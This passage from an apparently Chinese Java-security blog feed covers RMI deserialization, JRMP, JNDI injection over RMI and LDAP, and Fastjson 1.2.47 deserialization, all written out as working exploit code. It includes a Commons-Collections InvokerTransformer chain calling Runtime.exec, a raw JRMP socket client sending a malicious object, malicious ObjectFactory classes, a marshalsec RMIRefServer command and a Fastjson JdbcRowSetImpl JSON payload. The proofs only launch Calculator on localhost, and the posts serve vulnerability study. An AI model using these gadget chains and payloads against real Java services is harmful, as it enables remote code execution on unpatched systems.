         System.out.println(<span class="string">"your work is "</span> + work);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        String url = <span class="string">"rmi://127.0.0.1:1099/User"</span>;</span><br><span class="line">        UserImpl user = <span class="keyword">new</span> UserImpl();</span><br><span class="line">        LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">        Naming.bind(url,user);</span><br><span class="line">        System.out.println(<span class="string">"the rmi is running ..."</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>Client<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.patrilic.rmi;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Target;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.rmi.Naming;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"><span class="comment">//import com.patrilic.rmi.Server;</span></span><br><span class="line"><span class="keyword">import</span> com.patrilic.rmi.Server.User;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Client</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        String url = <span class="string">"rmi://127.0.0.1:1099/User"</span>;</span><br><span class="line">        User userClient = (User)Naming.lookup(url);</span><br><span class="line"></span><br><span class="line">        System.out.println(userClient.name(<span class="string">"lala"</span>));</span><br><span class="line">        userClient.say(<span class="string">"world"</span>);</span><br><span class="line">        userClient.dowork(getpayload());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title">getpayload</span><span class="params">()</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">"getMethod"</span>, <span class="keyword">new</span> Class[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> Object[]&#123;<span class="string">"getRuntime"</span>, <span class="keyword">new</span> Class[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">"invoke"</span>, <span class="keyword">new</span> Class[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> Object[]&#123;<span class="keyword">null</span>, <span class="keyword">new</span> Object[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">"exec"</span>, <span class="keyword">new</span> Class[]&#123;String.class&#125;, <span class="keyword">new</span> Object[]&#123;<span class="string">"open -a /System/Applications/Calculator.app"</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        Transformer transformerChain = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line"></span><br><span class="line">        Map map = <span class="keyword">new</span> HashMap();</span><br><span class="line">        map.put(<span class="string">"value"</span>, <span class="string">"lala"</span>);</span><br><span class="line">        Map transformedMap = TransformedMap.decorate(map, <span class="keyword">null</span>, transformerChain);</span><br><span class="line"></span><br><span class="line">        Class cl = Class.forName(<span class="string">"sun.reflect.annotation.AnnotationInvocationHandler"</span>);</span><br><span class="line">        Constructor ctor = cl.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        ctor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        Object instance = ctor.newInstance(Target.class, transformedMap);</span><br><span class="line">        <span class="keyword">return</span> instance;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><img src="/RMI.resources/94649F71-BD5F-4501-8533-05186989EF5E.png" alt="fd8180230a402fa03b6d9123c9a54cd8"></p><p>Github有个项目<a href="https://github.com/NickstaDB/BaRMIe" target="_blank" rel="noopener">BaRMIe</a><br><img src="/RMI.resources/91418487-960E-40F2-84CC-127BFF0F8632.png" alt="4068e65bae9aa6e9ee8435025c76b6eb"></p><h2 id="0x05-JRMP"><a href="#0x05-JRMP" class="headerlink" title="0x05 JRMP"></a>0x05 JRMP</h2><p><code>Java远程方法协议（英语：Java Remote Method Protocol，JRMP）是特定于Java技术的、用于查找和引用远程对象的协议。这是运行在Java远程方法调用（RMI）之下、TCP/IP之上的线路层协议</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.patrilic.rmi;</span><br><span class="line"><span class="keyword">import</span> sun.rmi.server.MarshalOutputStream;</span><br><span class="line"><span class="keyword">import</span> sun.rmi.transport.TransportConstants;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.DataOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.OutputStream;</span><br><span class="line"><span class="keyword">import</span> java.net.Socket;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">JRMI</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">      <span class="keyword">if</span> (args.length == <span class="number">0</span>) &#123;</span><br><span class="line">         args = <span class="keyword">new</span> String[]&#123;<span class="string">"127.0.0.1"</span>, String.valueOf(<span class="string">"9527"</span>), <span class="string">"open -a Calculator.app"</span>&#125;;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">final</span> String host = args[<span class="number">0</span>];</span><br><span class="line">      <span class="keyword">final</span> <span class="keyword">int</span> port = Integer.parseInt(args[<span class="number">1</span>]);</span><br><span class="line">      <span class="keyword">final</span> String command = args[<span class="number">2</span>];</span><br><span class="line">      Socket socket = <span class="keyword">null</span>;</span><br><span class="line">      OutputStream out = <span class="keyword">null</span>;</span><br><span class="line">      <span class="keyword">try</span> &#123;</span><br><span class="line">         Object payloadObject = RMIExploit.genPayload(command);</span><br><span class="line">         socket = <span class="keyword">new</span> Socket(<span class="string">"127.0.0.1"</span>, <span class="number">9527</span>);</span><br><span class="line">         socket.setKeepAlive(<span class="keyword">true</span>);</span><br><span class="line">         socket.setTcpNoDelay(<span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line">         <span class="comment">// 获取Socket的输出流对象</span></span><br><span class="line">         out = socket.getOutputStream();</span><br><span class="line"></span><br><span class="line">         <span class="comment">// 将Socket的输出流转换成DataOutputStream对象</span></span><br><span class="line">         DataOutputStream dos = <span class="keyword">new</span> DataOutputStream(out);</span><br><span class="line"></span><br><span class="line">         <span class="comment">// 创建MarshalOutputStream对象</span></span><br><span class="line">         ObjectOutputStream baos = <span class="keyword">new</span> MarshalOutputStream(dos);</span><br><span class="line"></span><br><span class="line">         <span class="comment">// 向远程RMI服务端Socket写入RMI协议并通过JRMP传输Payload序列化对象</span></span><br><span class="line">         dos.writeInt(TransportConstants.Magic);<span class="comment">// 魔数</span></span><br><span class="line">         dos.writeShort(TransportConstants.Version);<span class="comment">// 版本</span></span><br><span class="line">         dos.writeByte(TransportConstants.SingleOpProtocol);<span class="comment">// 协议类型</span></span><br><span class="line">         dos.write(TransportConstants.Call);<span class="comment">// RMI调用指令</span></span><br><span class="line">         baos.writeLong(<span class="number">2</span>); <span class="comment">// DGC</span></span><br><span class="line">         baos.writeInt(<span class="number">0</span>);</span><br><span class="line">         baos.writeLong(<span class="number">0</span>);</span><br><span class="line">         baos.writeShort(<span class="number">0</span>);</span><br><span class="line">         baos.writeInt(<span class="number">1</span>); <span class="comment">// dirty</span></span><br><span class="line">         baos.writeLong(<span class="number">1L</span>);<span class="comment">// 接口Hash值</span></span><br><span class="line"></span><br><span class="line">         <span class="comment">// 写入恶意的序列化对象</span></span><br><span class="line">         baos.writeObject(payloadObject);</span><br><span class="line"></span><br><span class="line">         dos.flush();</span><br><span class="line">      &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">         e.printStackTrace();</span><br><span class="line">      &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">         <span class="comment">// 关闭Socket输出流</span></span><br><span class="line">         <span class="keyword">if</span> (out != <span class="keyword">null</span>) &#123;</span><br><span class="line">            out.close();</span><br><span class="line">         &#125;</span><br><span class="line"></span><br><span class="line">         <span class="comment">// 关闭Socket连接</span></span><br><span class="line">         <span class="keyword">if</span> (socket != <span class="keyword">null</span>) &#123;</span><br><span class="line">            socket.close();</span><br><span class="line">         &#125;</span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="0x06-相关链接"><a href="#0x06-相关链接" class="headerlink" title="0x06 相关链接"></a>0x06 相关链接</h2><p><a href="https://javasec.org/javase/RMI/" target="_blank" rel="noopener">https://javasec.org/javase/RMI/</a><br><a href="https://xz.aliyun.com/t/7079" target="_blank" rel="noopener">https://xz.aliyun.com/t/7079</a><br><a href="https://xz.aliyun.com/t/2223" target="_blank" rel="noopener">https://xz.aliyun.com/t/2223</a><br><a href="https://xz.aliyun.com/t/6660#toc-0" target="_blank" rel="noopener">https://xz.aliyun.com/t/6660#toc-0</a><br><a href="https://blog.51cto.com/liyongyao/1205723" target="_blank" rel="noopener">https://blog.51cto.com/liyongyao/1205723</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;p&gt;@Author: Patrilic&lt;br&gt;@Time: 2020-3-17 16:41:55&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;img src=&quot;/wallpaper/sky.jpg&quot; alt&gt;&lt;/p&gt;
&lt;h2 id=&quot;0x00-前言&quot;&gt;
      
    
    </summary>
    
      <category term="Java_Sec" scheme="http://patrilic.top/categories/Java-Sec/"/>
    
    
      <category term="RMI" scheme="http://patrilic.top/tags/RMI/"/>
    
  </entry>
  
  <entry>
    <title>JNDI注入</title>
    <link href="http://patrilic.top/2020/03/15/JNDI%E6%B3%A8%E5%85%A5/"/>
    <id>http://patrilic.top/2020/03/15/JNDI注入/</id>
    <published>2020-03-15T08:41:55.000Z</published>
    <updated>2020-03-15T08:46:52.757Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>@Author: Patrilic<br>@Time: 2020-3-15 16:41:55</p></blockquote><p><img src="/wallpaper/girl_rain_anime.jpg" alt></p><h2 id="0x00-JNDI"><a href="#0x00-JNDI" class="headerlink" title="0x00 JNDI"></a>0x00 JNDI</h2><p><code>JNDI(Java Naming and Directory Interface)</code>是Java提供的Java 命名和目录接口。</p><p>JNDI是一个API，允许客户端通过name发现和查找数据和对象。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// JndiName</span></span><br><span class="line">String jndiName= ...;</span><br><span class="line"><span class="comment">// Initial</span></span><br><span class="line">Context context = <span class="keyword">new</span> InitialContext();</span><br><span class="line"><span class="comment">// lookup该name的数据</span></span><br><span class="line">DataSource ds = (DataSourse)context.lookup(jndiName);</span><br></pre></td></tr></table></figure><h2 id="0x01-JNDI-RMI"><a href="#0x01-JNDI-RMI" class="headerlink" title="0x01 JNDI-RMI"></a>0x01 JNDI-RMI</h2><p>JNDI注入就是如果我们可以任意控制<code>jndiName</code>的值，那么就可以通过加载JNDI，远程执行Class</p><p>RMI的工厂类： <code>com.sun.jndi.rmi.registry.RegistryContextFactory</code><br>poc.java<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.patrilic.jndipoc;</span><br><span class="line"><span class="keyword">import</span> javax.naming.Context;</span><br><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">poc</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"></span><br><span class="line">        String uri = <span class="string">"rmi://127.0.0.1:1099/Exploit"</span>;</span><br><span class="line">        Context ctx = <span class="keyword">new</span> InitialContext();</span><br><span class="line">        ctx.lookup(uri);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>Exploit.java<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.naming.Context;</span><br><span class="line"><span class="keyword">import</span> javax.naming.Name;</span><br><span class="line"><span class="keyword">import</span> javax.naming.spi.ObjectFactory;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.util.Hashtable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Exploit</span> <span class="keyword">implements</span> <span class="title">ObjectFactory</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">getObjectInstance</span><span class="params">(Object obj, Name name, Context nameCtx, Hashtable&lt;?, ?&gt; environment)</span> </span>&#123;</span><br><span class="line">        exec(<span class="string">"xterm"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">exec</span><span class="params">(String cmd)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">"/System/Applications/Calculator.app/Contents/MacOS/Calculator"</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">""</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        exec(<span class="string">"123"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>利用<code>marshalsec</code>起一个rmiServer<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer http://127.0.0.1:8001/\<span class="comment">#Exploit</span></span><br></pre></td></tr></table></figure></p><p>调用链<br><img src="/JNDI注入.resources/92E79E2A-D953-4AF0-A601-3E1E9CDE9BF9.png" alt="32b3b6b9a468d18fdcca883f96a4ccb1"></p><p><code>javax/naming/InitialContext.java</code><br><img src="/JNDI注入.resources/3F51F62A-01B2-45C2-8387-D8D76D25CAA8.png" alt="137ab716e3170cda87bb1a02e86f4699"></p><p><img src="/JNDI注入.resources/B1DFB787-7E64-4203-BF7D-6ACA2CEFE1A1.png" alt="95081010ce99e4df47e36e42bdd897fa"></p><p><code>com/sun/jndi/toolkit/url/GenericURLContext.class</code><br><img src="/JNDI注入.resources/4181C1B9-2077-4823-B7F8-E401B35D0E9D.png" alt="607cf22fd764178219e5633d3e59148f"></p><p><code>com/sun/jndi/rmi/registry/RegistryContext.class</code><br><img src="/JNDI注入.resources/F361357C-1D3E-4502-89DD-C280371B033A.png" alt="d2b4b2f2faf09b2ce06fc10d4539c4f0"></p><p>与registry通讯，获取RMI服务的IP。</p><p><img src="/JNDI注入.resources/B42F2E52-85BF-4AA8-8899-24B222662FCB.png" alt="8aa11b1b8c40eec91bdcbbed5a494f92"></p><p><img src="/JNDI注入.resources/CC81020D-AC99-4A06-B341-7505292F613D.png" alt="42720ae0c9153a7bb3eab271e128d0e8"></p><p>直接进入到<code>help.loadClass()</code><br><img src="/JNDI注入.resources/EF974C32-309A-4DDE-885F-4D3E71E1E9AD.png" alt="87bce328ebf0fa13b8037366c4ef1087"></p><h2 id="0x02-JNDI-LDAP"><a href="#0x02-JNDI-LDAP" class="headerlink" title="0x02 JNDI-LDAP"></a>0x02 JNDI-LDAP</h2><p>LDAP工厂类：<code>com.sun.jndi.ldap.LdapCtxFactory</code><br>poc.java<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.patrilic.jndipoc;</span><br><span class="line"><span class="keyword">import</span> javax.naming.Context;</span><br><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">poc</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"></span><br><span class="line">        String uri = <span class="string">"ldap://127.0.0.1:1389/Exploit"</span>;</span><br><span class="line">        Context ctx = <span class="keyword">new</span> InitialContext();</span><br><span class="line">        ctx.lookup(uri);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><img src="/JNDI注入.resources/B2295304-CC10-4C71-A29F-20C8554F8B60.png" alt="52120be59855a8db14c257f25beb3d23"></p><p>首先同样通过<code>javax/naming/InitialContext.java#lookup</code><br><img src="/JNDI注入.resources/F71697CE-D541-49CD-ABEC-28EEB4F1FCCE.png" alt="ad07da697b51c5e87ca3d8064b4895ee"></p><p>ldap在<code>com/sun/jndi/url/ldap/ldapURLContext.class</code>中进行处理<br><img src="/JNDI注入.resources/FDE49127-3E24-4369-9C6E-48A8A02E251D.png" alt="1fa1f1b14a630beaeaccfdc99216d0f7"></p><p><code>com/sun/jndi/toolkit/url/GenericURLContext.class</code><br><img src="/JNDI注入.resources/B4EB7A4C-DC01-48C6-AA82-BDF95279FF57.png" alt="126e64ab851965efa7b676a457fccd7b"></p><p><code>com/sun/jndi/ldap/LdapCtx.class</code><br><img src="/JNDI注入.resources/4DD9DB27-036B-40B6-9592-F923D6B35B4B.png" alt="72af0a6022ea2a61b0136234c217f32d"></p><p>最后覆盖类执行命令<br><code>javax/naming/spi/DirectoryManager.jave</code><br><img src="/JNDI注入.resources/247C763C-A383-4710-8437-10FF0ACE4A4C.png" alt="f7e10059444f062b7247cd023beb22be"></p><h2 id="0x03-版本限制"><a href="#0x03-版本限制" class="headerlink" title="0x03 版本限制"></a>0x03 版本限制</h2><ul><li>RMI动态加载恶意类 : 7u21、6u45</li><li>JNDI - RMI : 6u132、7u122、8u113</li><li>JNDI - LDAP : 6u211、7u201、8u191、11.0.1</li></ul><h2 id="0x04-相关链接"><a href="#0x04-相关链接" class="headerlink" title="0x04 相关链接"></a>0x04 相关链接</h2><p><a href="https://xz.aliyun.com/t/6633" target="_blank" rel="noopener">https://xz.aliyun.com/t/6633</a><br><a href="https://kingx.me/Exploit-Java-Deserialization-with-RMI.html" target="_blank" rel="noopener">https://kingx.me/Exploit-Java-Deserialization-with-RMI.html</a><br><a href="https://javasec.org/javase/JNDI/" target="_blank" rel="noopener">https://javasec.org/javase/JNDI/</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;p&gt;@Author: Patrilic&lt;br&gt;@Time: 2020-3-15 16:41:55&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;img src=&quot;/wallpaper/girl_rain_anime.jpg&quot; alt&gt;&lt;/p&gt;
&lt;h2 i
      
    
    </summary>
    
      <category term="Java_Sec" scheme="http://patrilic.top/categories/Java-Sec/"/>
    
    
      <category term="JNDI" scheme="http://patrilic.top/tags/JNDI/"/>
    
  </entry>
  
  <entry>
    <title>Fastjson =&lt; 1.2.47 反序列化漏洞分析</title>
    <link href="http://patrilic.top/2020/03/14/Fastjson%20=%3C%201.2.47%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    <id>http://patrilic.top/2020/03/14/Fastjson =&lt; 1.2.47 反序列化漏洞分析/</id>
    <published>2020-03-14T15:08:55.000Z</published>
    <updated>2020-03-14T15:13:29.100Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>@Author: Patrilic<br>@Time: 2020-3-14 23:08:55</p></blockquote><p><img src="/wallpaper/33703665.png" alt></p><h2 id="0x00-RMI和LDAP的适用版本"><a href="#0x00-RMI和LDAP的适用版本" class="headerlink" title="0x00 RMI和LDAP的适用版本"></a>0x00 RMI和LDAP的适用版本</h2><ul><li>RMI的利用方式：适用jdk版本：JDK 6u132, JDK 7u122, JDK 8u113之前。</li><li>LDAP的利用方式：适用jdk版本：JDK 11.0.1、8u191、7u201、6u211之前。</li></ul><h2 id="0x01-Poc"><a href="#0x01-Poc" class="headerlink" title="0x01 Poc"></a>0x01 Poc</h2><p>Exp.java<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.patrilic.fastjson;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="comment">//import com.alibaba.fastjson.JSONObject;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">exp</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] argv)</span> </span>&#123;</span><br><span class="line"><span class="comment">//        System.out.print("Success");</span></span><br><span class="line">        String payload = <span class="string">"&#123;\"name\":&#123;\"@type\":\"java.lang.Class\",\"val\":\"com.sun.rowset.JdbcRowSetImpl\"&#125;,\"x\":&#123;\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"rmi://localhost:1099/Exploit\",\"autoCommit\":true&#125;&#125;&#125;"</span>;</span><br><span class="line">        JSON.parse(payload);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>Exploit.java<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.naming.Context;</span><br><span class="line"><span class="keyword">import</span> javax.naming.Name;</span><br><span class="line"><span class="keyword">import</span> javax.naming.spi.ObjectFactory;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.util.Hashtable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Exploit</span> <span class="keyword">implements</span> <span class="title">ObjectFactory</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">getObjectInstance</span><span class="params">(Object obj, Name name, Context nameCtx, Hashtable&lt;?, ?&gt; environment)</span> </span>&#123;</span><br><span class="line">        exec(<span class="string">"xterm"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">exec</span><span class="params">(String cmd)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">"/System/Applications/Calculator.app/Contents/MacOS/Calculator"</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">""</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">   